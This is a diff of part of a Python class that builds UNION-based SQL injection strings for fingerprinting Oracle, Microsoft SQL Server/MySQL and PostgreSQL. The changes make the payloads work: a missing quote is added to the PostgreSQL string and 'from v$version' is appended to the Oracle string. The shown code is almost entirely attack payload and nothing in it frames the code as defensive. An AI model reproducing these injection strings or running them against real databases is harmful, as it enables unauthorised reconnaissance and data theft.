@@ -24,14 +24,14 @@ class Columns:
         # ORACLE
         oracle ="' union select banner"
         microsoft_mysql = "' union select @@version" # microsoft and mysql have the same query
-        postgre = "union select version()"
+        postgre = "' union select version()"
 
         for i in range(self.__amount - 1):
             oracle += ', null'
             microsoft_mysql += ', null'
             postgre += ', null'
         
-        oracle += '-- -'
+        oracle += ' from v$version-- -'
         microsoft_mysql += '-- -'
         postgre += '-- -'
 
